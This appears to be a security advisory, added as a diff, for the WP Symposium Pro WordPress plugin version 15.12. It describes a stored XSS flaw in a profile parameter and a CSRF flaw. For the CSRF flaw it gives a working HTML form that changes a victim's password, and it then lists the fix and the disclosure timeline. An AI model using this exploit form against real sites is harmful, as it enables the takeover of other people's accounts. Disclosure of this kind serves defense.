@@ -1,0 +1,65 @@
+#Product                : WP Symposium Pro Social Network plugin
+#Exploit Author      : Rahul Pratap Singh
+#Home page Link  : https://wordpress.org/plugins/wp-symposium-pro
+#Version                : 15.12
+#Website               : 0x62626262.wordpress.com
+#Twitter                 : @0x62626262
+#Linkedin : https://in.linkedin.com/in/rahulpratapsingh94
+#Date                    : 8/Jan/2016
+
+1) XSS Vulnerability:
+
+Vulnerable Code:
+
+file: wps_usermeta_shortcodes.php
+
+"wpspro_country" parameter is not sanitized, that leads to persistent xss.
+
+Video Demonstration:
+https://www.youtube.com/watch?v=Xglc3rNZPXs
+
+2) CSRF Vulnerability:
+
+Description:
+
+Edit profile page is vulnerable to CSRF, that allows to change password
+which in turn leads to full account takeover.
+
+Exploit:
+
+<html>
+  <body>
+    <form action="http://localhost/wp422/wordpress/index.php/edit-profile/"
+method="POST" enctype="multipart/form-data">
+      <input type="hidden" name="wps&#95;usermeta&#95;change&#95;update"
+value="yes" />
+      <input type="hidden" name="wpspro&#95;display&#95;name" value="rahul"
+/>
+      <input type="hidden" name="wpspro&#95;firstname" value="hello1" />
+      <input type="hidden" name="wpspro&#95;lastname" value="hello2" />
+      <input type="hidden" name="wpspro&#95;email" value="&#13;" />
+      <input type="hidden" name="wpsro&#95;home" value="hello4" />
+      <input type="hidden" name="wpspro&#95;country" value="hello5" />
+      <input type="hidden" name="wpspro&#95;password" value="asdf" />
+      <input type="hidden" name="wpspro&#95;password2" value="asdf" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+
+Video Demonstration:
+https://www.youtube.com/watch?v=sN65HlCRe9c
+
+
+Fix:
+
+Update to version 16.1
+
+
+Disclosure Timeline:
+
+reported to vendor  : 6/1/2016
+vendor response     : 6/1/2016
+vendor acknowledged : 6/1/2016
+vendor scheduled a patch: 7/1/2016
+CVE Number : Not assigned yet
